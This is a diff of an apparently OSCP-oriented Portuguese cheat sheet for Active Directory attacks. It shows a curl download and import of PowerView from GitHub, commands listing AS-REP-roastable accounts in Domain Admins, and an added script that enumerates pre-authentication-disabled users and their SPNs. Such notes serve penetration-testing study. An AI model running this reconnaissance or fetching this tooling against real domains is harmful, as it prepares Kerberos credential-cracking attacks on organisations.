@@ -364,7 +364,7 @@ import-module .\Microsoft.ActiveDirectory.Management.dll
 curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
 import-module .\PowerView.ps1
 ```
-##### KERBEROASTING-ASREP - FIND SPN
+##### KERBEROASTING-ASREP - FIND USERS
 PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
 ```
 Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
@@ -376,6 +376,28 @@ Get-DomainUser -PreauthNotRequired
 Get-DomainUser -PreauthNotRequired | select samaccountname
 Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'}
 Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'} | select samaccountname
+```
+##### KERBEROASTING-ASREP - FIND ALL USERS
+```
+$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$MySearch.filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+$MyResults = $MySearch.Findall()
+foreach($result in $MyResults)
+{
+ $userEntry = $result.GetDirectoryEntry()
+ Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
+ Write-host "DN = "  $userEntry.distinguishedName
+ Write-host "Object Cat. = "  $userEntry.objectCategory
+ Write-host "SamAccountName = "  $userEntry.SamAccountName
+ Write-host "servicePrincipalNames"
+ $i=1
+ foreach($SPN in $userEntry.servicePrincipalName)
+  {
+  Write-host "SPN(" $i ")   = "   $SPN
+  $i+=1
+  }
+  Write-host ""
+  }
 ```
 # POWERSHELL
 ## DOWNLOAD
